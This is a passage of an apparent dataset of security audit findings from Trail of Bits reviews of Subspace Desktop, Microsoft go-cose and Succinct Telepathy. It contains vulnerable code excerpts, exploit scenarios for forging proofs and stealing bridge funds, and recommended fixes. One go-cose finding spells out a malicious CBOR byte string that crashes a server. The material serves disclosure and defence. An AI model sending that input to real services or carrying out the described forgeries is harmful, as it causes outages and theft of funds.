( RUSTSEC-2020-0071 ) 0.2.23 and newer ansi_term 0.12.1 dotenv 0.15.0 xml-rs 0.8.4 Unmaintained crate ( RUSTSEC-2021-0139 ) Unmaintained crate ( RUSTSEC-2021-0141 ) Unmaintained crate ( RUSTSEC-2022-0048 ) blake2 0.10.2 Yanked crate block-buffer 0.10.0 Yanked crate cpufeatures 0.2.1 Yanked crate iana-time-zone 0.1.44 Yanked crate Multiple alternatives dotenvy quick-xml 0.10.4 0.10.3 0.2.5 0.1.50 sp-version 5.0. For the Node dependencies used in the Tauri application, one is vulnerable to a high-severity issue and another is vulnerable to a moderate-severity issue. These vulnerable dependencies appear to be used only in the development dependencies. Package Finding Latest Safe Version got CVE-2022-33987 (Moderate severity) 11.8.5 and newer git-clone CVE-2022-25900 (High severity) Not available Exploit Scenario An attacker nds a way to exploit a known memory corruption vulnerability in one of the dependencies reported above and takes control of the application. Recommendations Short term, update the dependencies to their newest possible versions. Work with the library authors to update the indirect dependencies. Monitor the development of the x for owning_ref and upgrade it as soon as a safe version of the crate becomes available. Long term, run cargo audit and yarn audit regularly. Include cargo audit and yarn audit in the projects CI/CD pipeline to ensure that the team is aware of new vulnerabilities in the dependencies.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "7. Broken error reporting link ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf", "body": "The create_full_client function calls the sp_panic_handler::set() function to set a URL for a Discord invitation; however, this invitation is broken. The documentation for the sp_panic_handler::set() function states that The bug_url parameter is an invitation for users to visit that URL to submit a bug report in the case where a panic happens. Because the link is broken, users cannot submit bug reports. sp_panic_handler::set( \" https://discord.gg/vhKF9w3x \" , env! ( \"SUBSTRATE_CLI_IMPL_VERSION\" ), ); Figure 7.1: subspace-desktop/src-tauri/src/node.rs#L169-L172 Exploit Scenario A user encounters a crash of Subspace Desktop and is presented with a broken link with which to report the error. The user is unable to report the error. Recommendations Short term, update the bug report link to the correct Discord invitation. Long term, use a URL on a domain controlled by Subspace Network as the bug reporting URL. This will allow Subspace Network developers to make adjustments to the reporting URL without pushing application updates. 8. Side e\u0000ects are triggered regardless of disk_farms validity Severity: Informational Diculty: High Type: Data Validation Finding ID: TOB-SPDF-8 Target: src-tauri/src/farmer.rs#L118-L192", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Network conguration path construction is duplicated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf", "body": "The create_full_client function contains code that uses hard-coded strings to indicate conguration paths (gure 9.1) in place of the previously dened DEFAULT_NETWORK_CONFIG_PATH and NODE_KEY_ED25519_FILE values, which are used in the other parts of the code. This is a risky coding pattern, as a Subspace developer who is updating the DEFAULT_NETWORK_CONFIG_PATH and NODE_KEY_ED25519_FILE values may forget to also update the equivalent values used in the create_full_client function. if primary_chain_node.client.info().best_number == 33670 { if let Some (config_dir) = config_dir { let workaround_file = config_dir.join( \"network\" ).join( \"gemini_1b_workaround\" ); if !workaround_file.exists() { let _ = std::fs::write(workaround_file, &[]); let _ = std::fs::remove_file( config_dir.join( \"network\" ).join( \"secret_ed25519\" ) ); return Err (anyhow!( \"Applied workaround for upgrade from gemini-1b-2022-jun-08, \\ please restart this node\" )); } } } Figure 9.1: subspace-desktop/src-tauri/src/node.rs#L207-L219 Recommendations Short term, update the code in gure 9.1 to use DEFAULT_NETWORK_CONFIG_PATH and NODE_KEY_ED25519_FILE rather than the hard-coded values. This will make eventual updates to these paths less error prone.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Unmarshalling can cause a panic if any header labels are unhashable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf", "body": "The ensureCritical function checks that all critical labels exist in the protected header. The check for each label is shown in Figure 1.1. 161 if _, ok := h[label]; !ok { Figure 1.1: Line 161 of headers.go The label in this case is deserialized from the users CBOR input. If the label is a non-hashable type (e.g., a slice or a map), then Go will runtime panic on line 161. Exploit Scenario Alice wishes to crash a server running go-cose. She sends the following CBOR message to the server: \\xd2\\x84G\\xc2\\xa1\\x02\\xc2\\x84@0000C000C000. When the server attempts to validate the critical headers during unmarshalling, it panics on line 161. Recommendations Short term, add a validation step to ensure that the elements of the critical header are valid labels. Long term, integrate go-coses existing fuzz tests into the CI pipeline. Although this bug was not discovered using go-coses preexisting fuzz tests, the tests likely would have discovered it if they ran for enough time. Fix Analysis This issue has been resolved. Pull request #78, committed to the main branch in b870a00b4a0455ab5c3da1902570021e2bac12da, adds validations to ensure that critical headers are only integers or strings. 15 Microsoft go-cose Security Assessment (DRAFT)", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. crit label is permitted in unvalidated headers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf", "body": "The crit header parameter identies which header labels must be understood by an application receiving the COSE message. Per RFC 8152, this value must be placed in the protected header bucket, which is authenticated by the message signature. Figure 2.1: Excerpt from RFC 8152 section 3.1 Currently, the implementation ensures during marshaling and unmarshaling that if the crit parameter is present in the protected header, then all indicated labels are also present in the protected header. However, the implementation does not ensure that the crit parameter is not present in the unprotected bucket. If a user mistakenly uses the unprotected header for the crit parameter, then other conforming COSE implementations may reject the message and the message may be exposed to tampering. Exploit Scenario A library user mistakenly places the crit label in the unprotected header, allowing an adversary to manipulate the meaning of the message by adding, removing, or changing the set of critical headers. Recommendations Add a check during ensureCritical to verify that the crit label is not present in the unprotected header bucket. Fix Analysis This issue has been resolved. Pull request #81, committed to the main branch in 62383c287782d0ba5a6f82f984da0b841e434298, adds validations to ensure that the crit label is not present in unprotected headers. 16 Microsoft go-cose Security Assessment (DRAFT)", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "3. Generic COSE header types are not validated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Microsoft-go-cose.pdf", "body": "Section 3.1 of RFC 8152 denes a number of common COSE header parameters and their associated value types. Applications using the go-cose library may rely on COSE-dened headers decoded by the library to be of a specied type. For example, the COSE specication denes the content-type header (label #3) as one of two types: a text string or an unsigned integer. The go-cose library validates only the alg and crit parameters, not content-type. See Figure 3.1 for a list of dened header types. Figure 3.1: RFC 8152 Section 3.1, Table 2 Further header types are dened by the IANA COSE Header Parameter Registry. 17 Microsoft go-cose Security Assessment (DRAFT) Exploit Scenario An application uses go-cose to verify and validate incoming COSE messages. The application uses the content-type header to index a map, expecting the content type to be a valid string or integer. An attacker could, however, supply an unhashable value, causing the application to panic. Recommendations Short term, explicitly document which IANA-dened headers or label ranges are and are not validated. Long term, validate commonly used headers for type and semantic consistency. For example, once counter signatures are implemented, the counter-signature (label #7) header should be validated for well-formedness during unmarshalling. 18 Microsoft go-cose Security Assessment (DRAFT)", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Prover can lock user funds by including ill-formed BigInts in public key commitment ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The Rotate circuit does not check for the validity of BigInts included in pubkeysBigIntY . A malicious prover can lock user funds by carefully selecting malformed public keys and using the Rotate function, which will prevent future provers from using the default witness generator to make new proofs. The Rotate circuit is designed to prove a translation between an SSZ commitment over a set of validator public keys produced by the Ethereum consensus protocol and a Poseidon commitment over an equivalent list. The SSZ commitment is over public keys serialized as 48-byte compressed BLS public keys, specifying an X coordinate and single sign bit, while the Poseidon commitment is over pairs (X, Y) , where X and Y are 7-limb, 55-bit BigInts. The prover species the Y coordinate for each public key as part of the witness; the Rotate circuit then uses SubgroupCheckG1WithValidX to constrain Y to be valid in the sense that (X, Y) is a point on the BLS12-381 elliptic curve. However, SubgroupCheckG1WithValidX assumes that its input is a properly formed BigInt, with all limbs less than 2 55 . This property is not validated anywhere in the Rotate circuit. By committing to a Poseidon root containing invalid BigInts, a malicious prover can prevent other provers from successfully proving a Step operation, bringing the light client to a halt and causing user funds to be stuck in the bridge. Furthermore, the invalid elliptic curve points would then be usable in the Step circuit, where they are passed without validation to the EllipticCurveAddUnequal function. The behavior of this function on ill-formed inputs is not specied and could allow a malicious prover to forge Step proofs without a valid sync committee signature. Figure 1.1 shows where the untrusted pubkeysBigIntY value is passed to the SubgroupCheckG1WithValidX template. /* VERIFY THAT THE WITNESSED Y-COORDINATES MAKE THE PUBKEYS LAY ON THE CURVE */ component isValidPoint[SYNC_COMMITTEE_SIZE]; for ( var i = 0 ; i < SYNC_COMMITTEE_SIZE; i++) { isValidPoint[i] = SubgroupCheckG1WithValidX(N, K); for ( var j = 0 ; j < K; j++) { isValidPoint[i]. in [ 0 ][j] <== pubkeysBigIntX[i][j]; isValidPoint[i]. in [ 1 ][j] <== pubkeysBigIntY[i][j]; } } Figure 1.1: telepathy/circuits/circuits/rotate.circom#101109 Exploit Scenario Alice, a malicious prover, uses a valid block header containing a sync committee update to generate a Rotate proof. Instead of using correctly formatted BigInts to represent the Y values of each public key point, she modies the value by subtracting one from the most signicant limb and adding 2 55 to the second-most signicant limb. She then posts the resulting proof to the LightClient contract via the rotate function, which updates the sync committee commitment to Alices Poseidon commitment containing ill-formed Y coordinates. Future provers would then be unable to use the default witness generator to make new proofs, locking user funds in the bridge. Alice may be able to then exploit invalid assumptions in the Step circuit to forge Step proofs and steal bridge funds. Recommendations Short term, use a Num2Bits component to verify that each limb of the pubkeysBigIntY witness value is less than 2 55 . Long term, clearly document and validate the input assumptions of templates such as SubgroupCheckG1WithValidX . Consider adopting Circom signal tags to automate the checking of these assumptions.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. Prover can lock user funds by supplying non-reduced Y values to G1BigIntToSignFlag ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The G1BigIntToSignFlag template does not check whether its input is a value properly reduced mod p . A malicious prover can lock user funds by carefully selecting malformed public keys and using the Rotate function, which will prevent future provers from using the default witness generator to make new proofs. During the Rotate proof, when translating compressed public keys to full (X, Y) form, the prover must supply a Y value with a sign corresponding to the sign bit of the compressed public key. The circuit calculates the sign of Y by passing the Y coordinate (supplied by the prover and represented as a BigInt) to the G1BigIntToSignFlag component (gure 2.1). This component determines the sign of Y by checking if 2*Y >= p . However, the correctness of this calculation depends on the Y value being less than p ; otherwise, a positive, non-reduced value such as p + 1 will be incorrectly interpreted as negative. A malicious prover could use this fact to commit to a non-reduced form of Y that diers in sign from the correct public key. This invalid commitment would prevent future provers from generating Step circuit proofs and thus halt the LightClient , trapping user funds in the Bridge . template G1BigIntToSignFlag(N, K) { signal input in [K]; signal output out; var P[K] = getBLS128381Prime(); var LOG_K = log_ceil(K); component mul = BigMult(N, K); signal two[K]; for ( var i = 0 ; i < K; i++) { if (i == 0 ) { two[i] <== 2 ; } else { two[i] <== 0 ; } } for ( var i = 0 ; i < K; i++) { mul.a[i] <== in [i]; mul.b[i] <== two[i]; } component lt = BigLessThan(N, K); for ( var i = 0 ; i < K; i++) { lt.a[i] <== mul.out[i]; lt.b[i] <== P[i]; } out <== 1 - lt.out; } Figure 2.1: telepathy/circuits/circuits/bls.circom#197226 Exploit Scenario Alice, a malicious prover, uses a valid block header containing a sync committee update to generate a Rotate proof. When one of the new sync committee members public key Y value has a negative sign, Alice substitutes it with 2P - Y . This value is congruent to -Y mod p , and thus has positive sign; however, the G1BigIntToSignFlag component will determine that it has negative sign and validate the inclusion in the Poseidon commitment. Future provers will then be unable to generate proofs from this commitment since the committed public key set does not match the canonical sync committee. Recommendations Short term, constrain the pubkeysBigIntY values to be less than p using BigLessThan . Long term, constrain all private witness values to be in canonical form before use. Consider adopting Circom signal tags to automate the checking of these assumptions.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "3. Incorrect handling of point doubling can allow signature forgery ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "When verifying the sync committee signature, individual public keys are aggregated into an overall public key by repeatedly calling G1Add in a tree structure. Due to the mishandling of elliptic curve point doublings, a minority of carefully selected public keys can cause the aggregation to result in an arbitrary, maliciously chosen public key, allowing signature forgeries and thus malicious light client updates. When bit1 and bit2 of G1Add are both set, G1Add computes out by calling EllipticCurveAddUnequal : template parallel G1Add(N, K) { var P[ 7 ] = getBLS128381Prime(); signal input pubkey1[ 2 ][K]; signal input pubkey2[ 2 ][K]; signal input bit1; signal input bit2; /* COMPUTE BLS ADDITION */ signal output out[ 2 ][K]; signal output out_bit; out_bit <== bit1 + bit2 - bit1 * bit2; component adder = EllipticCurveAddUnequal( 55 , 7 , P); for ( var i = 0 ; i < 2 ; i++) { for ( var j = 0 ; j < K; j++) { adder.a[i][j] <== pubkey1[i][j]; adder.b[i][j] <== pubkey2[i][j]; } } Figure 3.1: telepathy/circuits/circuits/bls.circom#82 The results of EllipticCurveAddUnequal are constrained by equations that reduce to 0 = 0 if a and b are equal: // constrain x_3 by CUBIC (x_1 + x_2 + x_3) * (x_2 - x_1)^2 - (y_2 - y_1)^2 = 0 mod p component dx_sq = BigMultShortLong(n, k, 2 *n+LOGK+ 2 ); // 2k-1 registers abs val < k*2^{2n} component dy_sq = BigMultShortLong(n, k, 2 *n+LOGK+ 2 ); // 2k-1 registers < k*2^{2n} for ( var i = 0 ; i < k; i++){ dx_sq.a[i] <== b[ 0 ][i] - a[ 0 ][i]; dx_sq.b[i] <== b[ 0 ][i] - a[ 0 ][i]; dy_sq.a[i] <== b[ 1 ][i] - a[ 1 ][i]; dy_sq.b[i] <== b[ 1 ][i] - a[ 1 ][i]; } [...] component cubic_mod = SignedCheckCarryModToZero(n, k, 4 *n + LOGK3, p); for ( var i= 0 ; i<k; i++) cubic_mod. in [i] <== cubic_red.out[i]; // END OF CONSTRAINING x3 // constrain y_3 by (y_1 + y_3) * (x_2 - x_1) = (y_2 - y_1)*(x_1 - x_3) mod p component y_constraint = PointOnLine(n, k, p); // 2k-1 registers in [0, k*2^{2n+1}) for ( var i = 0 ; i < k; i++) for ( var j= 0 ; j< 2 ; j++){ y_constraint. in [ 0 ][j][i] <== a[j][i]; y_constraint. in [ 1 ][j][i] <== b[j][i]; y_constraint. in [ 2 ][j][i] <== out[j][i]; } // END OF CONSTRAINING y3 Figure 3.2: telepathy/circuits/circuits/pairing/curve.circom#182221 If any inputs to G1Add are equal, a malicious prover can choose outputs to trigger this bug repeatedly and cause the signature to be checked with a public key of their choice. Each input to G1Add can be either a committee member public key or an intermediate aggregate key. Exploit Scenario Alice, a malicious prover, registers public keys A = aG , B = bG and C = (a+b)G . She waits for a sync committee selection in which A , B and C are all present and located in the same subtree of the sync committee participation array. By setting all other participation bits in that subtree to zero, Alice can force EllipticCurveAddUnequal to be called on A+B and C . Using the underconstrained point addition formula, she can prove that the sum of these points is equal to the next subtree root, and repeat until she has arbitrarily selected the aggregated public key. Alice can then forge a signature for an arbitrary block header and steal all user funds. Recommendations Short term, change G1Add to use EllipticCurveAdd , which correctly handles equal inputs. Long term, review all uses of EllipticCurveAddUnequal to ensure that the inputs have dierent X components.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. EllipticCurveAdd mishandles points at innity ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The EllipticCurveAdd and EllipticCurveAddFp2 templates contain a logic bug when handling points at innity, which can cause them to return incorrect results for specic sequences of elliptic curve point additions. The EllipticCurveAdd template is currently unused in the Telepathy codebase, while EllipticCurveAddFp2 is used only in the context of cofactor clearing during the hash-to-curve process. Because the bug is triggered only in special sequences of operations, as described below, the random inputs generated by the hashing process are extremely unlikely to trigger the bug. However, if EllipticCurveAdd were to be used in the future (e.g., as we recommend in TOB-SUCCINCT-3 ), this bug may be exploitable using carefully chosen malicious inputs. Figure 4.1 shows the logic, contained in EllipticCurveAdd and EllipticCurveAddFp2 , that determines whether the point returned from EllipticCurveAdd is the point at innity. // If isInfinity = 1, replace `out` with `a` so if `a` was on curve, so is output ... // out = O iff ( a = O AND b = O ) OR ( x_equal AND NOT y_equal ) signal ab0; ab0 <== aIsInfinity * bIsInfinity; signal anegb; anegb <== x_equal.out - x_equal.out * y_equal.out; isInfinity <== ab0 + anegb - ab0 * anegb; // OR gate Figure 4.1: telepathy/circuits/circuits/pairing/curve.circom#344349 When point A is the point at innity, represented in projective coordinates as (X, Y, 0) , and B is the point (X, -Y, 1) , EllipticCurveAdd should return B unchanged and in particular should set isInfinity to zero. However, because the x_equal AND NOT y_equal clause is satised, the EllipticCurveAdd function returns A (a point at innity). This edge case is reachable by computing the sequence of additions (A - A) - A , for any point A , which will return O instead of the correct result of -A . This edge case was rst noted in a GitHub issue ( #13 ) in the upstream yi-sun/circom-pairing library. We discovered that the edge case is in fact reachable via the sequence above and upstreamed a patch . Exploit Scenario The Succinct Labs developers modify the G1Add template as recommended in TOB-SUCCINCT-3 . A malicious sync committee member then constructs public keys such that the G1Add process produces a sequence of additions that trigger the bug. Honest provers then cannot create proofs due to the miscomputed aggregate public key, causing funds to become stuck in the bridge. Recommendations Short term, update the pairing circuits to match the latest version of yi-sun/circom-pairing . Long term, consider making the pairing and SHA-256 libraries npm dependencies or Git submodules so that developers can easily keep up to date with security xes in the upstream libraries.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Circom circuits lack adequate testing framework ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The Telepathy Circom circuits do not have functioning unit tests or a systematic testing framework. Running the end-to-end circuit tests requires a large amount of RAM, disk space, and CPU time, and is infeasible on typical developer machines. Because it is dicult to rapidly develop and run tests, new code changes are likely to be insuciently tested before deployment. The presence of a testing framework greatly aids security engineers, as it allows for the rapid adaptation of testing routines into security testing routines. Recommendations Short term, begin writing unit tests for each sub-circuit and requiring tests for all new code. Long term, implement a framework for rapidly running all unit tests as well as end-to-end tests on scaled-down versions of the full circuits.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "6. Poseidon commitment uses a non-standard hash construction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "Telepathy commits to the set of sync committee public keys with a Poseidon-based hash function. This hash function uses a construction with poor theoretical properties. The hash is computed by PoseidonFieldArray , using a MerkleDamgrd construction with circomlib s Poseidon template as the compression function: template PoseidonFieldArray(LENGTH) { signal input in [LENGTH]; signal output out ; var POSEIDON_SIZE = 15 ; var NUM_HASHERS = (LENGTH \\ POSEIDON_SIZE) + 1 ; component hashers[NUM_HASHERS]; for ( var i = 0 ; i < NUM_HASHERS; i++) { if (i > 0 ) { POSEIDON_SIZE = 16 ; } hashers[i] = Poseidon(POSEIDON_SIZE); for ( var j = 0 ; j < 15 ; j++) { if (i * 15 + j >= LENGTH ) { hashers[i].inputs[j] <== 0 ; } else { hashers[i].inputs[j] <== in [i*15 + j]; } } if (i > 0 ) { hashers[i].inputs[15] <== hashers[i- 1]. out ; } } out <== hashers[NUM_HASHERS-1]. out ; } Figure 6.1: telepathy/circuits/circuits/poseidon.circom#2551 The Poseidon authors recommend using a sponge construction, which has better provable security properties than the MD construction. One could implement a sponge by using PoseidonEx with nOuts = 1 for intermediate calls and nOuts = 2 for the nal call. For each call, out[0] should be passed into the initialState of the next PoseidonEx component, and out[1] should be used for the nal output. By maintaining out[0] as hidden capacity, the overall construction will closely approximate a pseudorandom function. Although the MD construction oers sucient protection against collision for the current commitment use case, hash functions constructed in this manner do not fully model random functions. Future uses of the PoseidonFieldArray circuit may expect stronger cryptographic properties, such as resistance to length extension. Additionally, by utilizing the initialState input, as shown in gure 6.2, on each permutation call, 16 inputs can be compressed per template instantiation, as opposed to the current 15, without any additional cost per compression. This will reduce the number of compressions required and thus reduce the size of the circuit. template PoseidonEx(nInputs, nOuts) { signal input inputs[nInputs]; signal input initialState; signal output out [nOuts]; Figure 6.2: circomlib/circuits/poseidon.circom#6770 Recommendations Short term, convert PoseidonFieldArray to use a sponge construction, ensuring that out[0] is preserved as a hidden capacity value. Long term, ensure that all hashing primitives are used in accordance with the published recommendations.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Merkle root reconstruction is vulnerable to forgery via proofs of incorrect length ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The TargetAMB contract accepts and veries Merkle proofs that a particular smart contract event was issued in a particular Ethereum 2.0 beacon block. Because the proof validation depends on the length of the proof rather than the index of the value to be proved, Merkle proofs with invalid lengths can be used to mislead the verier and forge proofs for nonexistent transactions. The SSZ.restoreMerkleRoot function reconstructs a Merkle root from the user-supplied transaction receipt and Merkle proof; the light client then compares the root against the known-good value stored in the LightClient contract. The index argument to restoreMerkleRoot determines the specic location in the block state tree at which the leaf node is expected to be found. The arguments leaf and branch are supplied by the prover, while the index argument is calculated by the smart contract verier. function restoreMerkleRoot ( bytes32 leaf , uint256 index , bytes32 [] memory branch) internal pure returns ( bytes32 ) { } bytes32 value = leaf; for ( uint256 i = 0 ; i < branch.length; i++) { if ((index / ( 2 ** i)) % 2 == 1 ) { value = sha256( bytes .concat(branch[i], value)); } else { value = sha256( bytes .concat(value, branch[i])); } } return value; Figure 7.1: telepathy/contracts/src/libraries/SimpleSerialize.sol#2438 A malicious user may supply a proof (i.e., a branch list) that is longer or shorter than the number of bits in the index . In this case, the leaf value will not in fact correspond to the receiptRoot but to some other value in the tree. In particular, the user can convince the smart contract that receiptRoot is the value at any generalized index given by truncating the leftmost bits of the true index or by extending the index by arbitrarily many zeroes following the leading set bit. If one of these alternative indexes contains data controllable by the user, who may for example be the block proposer, then the user can forge a proof for a transaction that did not occur and thus steal funds from bridges relying on the TargetAMB . Exploit Scenario Alice, a malicious ETH2.0 validator, encodes a fake transaction receipt hash encoding a deposit to a cross-chain bridge into the graffiti eld of a BeaconBlock . She then waits for the block to be added to the HistoricalBlocks tree and further for the generalized index of the historical block to coincide with an allowable index for the Merkle tree reconstruction. She then calls executeMessageFromLog with the transaction receipt, allowing her to withdraw from the bridge based on a forged proof of deposit and steal funds. Recommendations Short term, rewrite restoreMerkleRoot to loop over the bits of index , e.g. with a while loop terminating when index = 1 . Long term, ensure that proof verication routines do not use control ow determined by untrusted input. The verication routine for each statement to be proven should treat all possible proofs uniformly.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "8. LightClient forced nalization could allow bad updates in case of a DoS ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "Under periods of delayed nality, the LightClient may nalize block headers with few validators participating. If the Telepathy provers were targeted by a denial-of-service (DoS) attack, this condition could be triggered and used by a malicious validator to take control of the LightClient and nalize malicious block headers. The LightClient contract typically considers a block header to be nalized if it is associated with a proof that more than two-thirds of sync committee participants have signed the header. Typically, the sync committee for the next period is determined from a nalized block in the current period. However, in the case that the end of the sync committee period is reached before any block containing a sync committee update is nalized, a user may call the LightClient.force function to apply the update with the most signatures, even if that update has less than a majority of signatures. A forced update may have as few as 10 participating signers, as determined by the constant MIN_SYNC_COMMITTEE_PARTICIPANTS . /// @notice In the case there is no finalization for a sync committee rotation, this method /// is used to apply the rotate update with the most signatures throughout the period. /// @param period The period for which we are trying to apply the best rotate update for. function force ( uint256 period ) external { LightClientRotate memory update = bestUpdates[period]; uint256 nextPeriod = period + 1 ; if (update.step.finalizedHeaderRoot == 0 ) { revert( \"Best update was never initialized\" ); } else if (syncCommitteePoseidons[nextPeriod] != 0 ) { revert( \"Sync committee for next period already initialized.\" ); } else if (getSyncCommitteePeriod(getCurrentSlot()) < nextPeriod) { revert( \"Must wait for current sync committee period to end.\" ); } setSyncCommitteePoseidon(nextPeriod, update.syncCommitteePoseidon); } Figure 8.1: telepathy/contracts/src/lightclient/LightClient.sol#123 Proving sync committee updates via the rotate ZK circuit requires signicant computational power; it is likely that there will be only a few provers online at any given time. In this case, a DoS attack against the active provers could cause the provers to be oine for a full sync committee period (~27 hours), allowing the attacker to force an update with a small minority of validator stake. The attacker would then gain full control of the light client and be able to steal funds from any systems dependent on the correctness of the light client. Exploit Scenario Alice, a malicious ETH2.0 validator, controls about 5% of the total validator stake, split across many public keys. She waits for a sync committee period, includes at least 10 of her public keys, then launches a DoS against the active Telepathy provers, using an attack such as that described in TOB-SUCCINCT-1 or an attack against the ochain prover/relayer client itself. Alice creates a forged beacon block with a new sync committee containing only her own public keys, then uses her 10 active committee keys to sign the block. She calls LightClient.rotate with this forged block and waits until the sync committee period ends, nally calling LightClient.force to gain control over all future light client updates. Recommendations Short term, consider removing the LightClient.force function, extending the waiting period before updates may be forced, or introducing a privileged role to mediate forced updates. Long term, explicitly document expected liveness behavior and associated safety tradeos.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "9. G1AddMany does not check for the point at innity ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The G1AddMany circuit aggregates multiple public keys into a single public key before verifying the BLS signature. The outcome of the aggregation is used within CoreVerifyPubkeyG1 as the public key. However, G1AddMany ignores the value of the nal out_bits , and wrongly converts a point at innity to a dierent point when all participation bits are zero. template G1AddMany(SYNC_COMMITTEE_SIZE, LOG_2_SYNC_COMMITTEE_SIZE, N, K) { signal input pubkeys[SYNC_COMMITTEE_SIZE][ 2 ][K]; signal input bits[SYNC_COMMITTEE_SIZE]; signal output out[ 2 ][K]; [...] for ( var i = 0 ; i < 2 ; i++) { for ( var j = 0 ; j < K; j++) { out[i][j] <== reducers[LOG_2_SYNC_COMMITTEE_SIZE- 1 ].out[ 0 ][i][j]; } } } Figure 9.1: BLS key aggregation without checks for all-zero participation bits ( telepathy/circuits/circuits/bls.circom#1648 ) Recommendations Short term, augment the G1AddMany template with an output signal that indicates whether the aggregated public key is the point at innity. Check that the aggregated public key is non-zero in the calling circuit by verifying that the output of G1AddMany is not the point at innity (for instance, in VerifySyncCommitteeSignature ). Long term, assert that all provided elliptic curve points are non-zero before converting them to ane form and using them where a non-zero point is expected.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. TargetAMB receipt proof may behave unexpectedly on future transaction types ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The TargetAMB contract can relay transactions from the SourceAMB via events logged in transaction receipts. The contract currently ignores the version specier in these receipts, which could cause unexpected behavior in future upgrade hard-forks. To relay a transaction from a receipt, the user provides a Merkle proof that a particular transaction receipt is present in a specied block; the relevant event is then parsed from the transaction receipt by the TargetAMB . function getEventTopic (...){ ... bytes memory value = MerklePatriciaProofVerifier.extractProofValue(receiptRoot, key, proofAsRLP); RLPReader.RLPItem memory valueAsItem = value.toRlpItem(); if (!valueAsItem.isList()) { // TODO: why do we do this ... valueAsItem.memPtr++; valueAsItem.len--; } RLPReader.RLPItem[] memory valueAsList = valueAsItem.toList(); require (valueAsList.length == 4 , \"Invalid receipt length\" ); // In the receipt, the 4th entry is the logs RLPReader.RLPItem[] memory logs = valueAsList[ 3 ].toList(); require (logIndex < logs.length, \"Log index out of bounds\" ); RLPReader.RLPItem[] memory relevantLog = logs[logIndex].toList(); ... } Figure 10.1: telepathy/contracts/src/libraries/StateProofHelper.sol#L44L82 The logic in gure 10.1 checks if the transaction receipt is an RLP list; if it is not, the logic skips one byte of the receipt before continuing with parsing. This logic is required in order to properly handle legacy transaction receipts as dened in EIP-2718 . Legacy transaction receipts directly contain the RLP-encoded list rlp([status, cumulativeGasUsed, logsBloom, logs]) , whereas EIP- TransactionType|| TransactionPayload , where TransactionType is a one-byte indicator between 0x00 and 0x7f and TransactionPayload may vary depending on the transaction type. Current valid transaction types are 0x01 and 0x02 . New transaction types may be added during routine Ethereum upgrade hard-forks. The TransactionPayload eld of type 0x01 and 0x02 transactions corresponds exactly to the LegacyTransactionReceipt format; thus, simply skipping the initial byte is sucient to handle these cases. However, EIP-2718 does not guarantee this backward compatibility, and future hard-forks may introduce transaction types for which this parsing method gives incorrect results. Because the current implementation lacks explicit validation of the transaction type, this discrepancy may go unnoticed and lead to unexpected behavior. Exploit Scenario An Ethereum upgrade fork introduces a new transaction type with a corresponding transaction receipt format that diers from the legacy format. If the new format has the same number of elds but with dierent semantics in the fourth slot, it may be possible for a malicious user to insert into that slot a value that parses as an event log for a transaction that did not take place, thus forging an arbitrary bridge message. Recommendations Short term, check the rst byte of valueAsItem against a list of allowlisted transaction types, and revert if the transaction type is invalid. Long term, plan for future incompatibilities due to upgrade forks; for example, consider adding a semi-trusted role responsible for adding new transaction type identiers to an allowlist.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. RLPReader library does not validate proper RLP encoding ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The TargetAMB uses the external RLPReader dependency to parse RLP-encoded nodes in the Ethereum state trie, including those provided by the user as part of a Merkle proof. When parsing a byte string as an RLPItem , the library does not check that the encoded payload length of the RLPitem matches the length of the underlying bytes. /* * @param item RLP encoded bytes */ function toRlpItem ( bytes memory item) internal pure returns (RLPItem memory ) { uint256 memPtr ; assembly { memPtr := add(item, 0x20 ) } return RLPItem(item.length, memPtr); } Figure 11.1: Solidity-RLP/contracts/RLPReader.sol#5161 If the encoded byte length of the RLPitem is too long or too short, future operations on the RLPItem may access memory before or after the bounds of the underlying buer. More generally, because the Merkle trie verier assumes that all input is in the form of valid RLP-encoded data, it is important to check that potentially malicious data is 